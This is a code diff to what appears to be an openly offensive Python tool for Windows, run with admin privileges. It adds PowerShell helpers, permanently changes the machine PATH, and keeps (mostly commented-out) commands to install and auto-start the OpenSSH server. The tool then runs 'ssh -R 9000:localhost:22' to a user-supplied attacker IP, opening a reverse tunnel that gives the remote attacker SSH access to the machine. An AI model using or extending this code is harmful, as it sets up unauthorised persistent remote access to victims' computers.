@@ -14,7 +14,66 @@ from time import sleep
 import platform
 import subprocess
 
+def find_powershell():
+    # Try PowerShell Core first
+    pwsh_path = r"C:\Program Files\PowerShell\7\pwsh.exe"
+    if os.path.exists(pwsh_path):
+        return pwsh_path
 
+    # Fallback to Windows PowerShell
+    ps_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+    if os.path.exists(ps_path):
+        return ps_path
+
+    raise FileNotFoundError("No PowerShell executable found")
+
+
+def run_ps(command):
+    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+    env = os.environ.copy()
+    env["PATH"] += r";C:\Windows\System32\OpenSSH"
+    # No capture_output, no check=True
+    proc = subprocess.Popen(
+        [ps, "-NoProfile", "-Command", command],
+        env=env
+    )
+    proc.wait()
+
+permapath = r'[Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";C:\Windows\System32\OpenSSH", [System.EnvironmentVariableTarget]::Machine)'
+run_ps(permapath)
+
+#def run_ps(command):
+#    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+#    # Copy current environment
+#    env = os.environ.copy()
+    # Append OpenSSH path
+#    env["PATH"] += r";C:\Windows\System32\OpenSSH"
+#    return subprocess.run(
+#        [ps, "-NoProfile", "-Command", command],
+#        check=True, capture_output=True, text=True,
+#        env=env
+#    )
+
+#define powershell path
+pspath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+
+#link for the openSSH installation: https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell&pivots=windows-10
+#installing OpenSSH Client and Server via PowerShell commands
+
+installsshd="Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
+#run_ps(installsshd)
+
+installsshdserver="Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
+#run_ps(installsshdserver)
+#sleep(2)
+startservice="Start-Service sshd"
+#run_ps(startservice)
+#sleep(2)
+startupsshd="Set-Service -Name sshd -StartupType 'Automatic'"
+#run_ps(startupsshd)
+#sleep(2)
+addtopath = '$env:PATH += ";C:\\Windows\\System32\\OpenSSH"'
+run_ps(addtopath)
 
 print(Fore.YELLOW + "!!!THIS PROGRAM IS NEEDED TO "+ Fore.RED + "RUN VIA CMD WITH ADMIN PRIVILEGES " + Fore.YELLOW + "TO RUN PROPERLY!!!")
 sleep(4)
@@ -142,7 +201,8 @@ while True:
                 sleep(0.1)
                 if correctsshinput == "y":
                     ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser+"@"+attackerip
-                    subprocess.run(["powershell", "-Command", ssh_tunnel], check=True)
+                    run_ps(ssh_tunnel)
+                    sleep(10)
                     cls()
                     print(Fore.YELLOW + "Attempting to connect to attacker on " + attackerip)
                     sleep(1)
@@ -163,5 +223,3 @@ while True:
         print("Exiting the program...")
         sleep(3)
         exit()
-
-
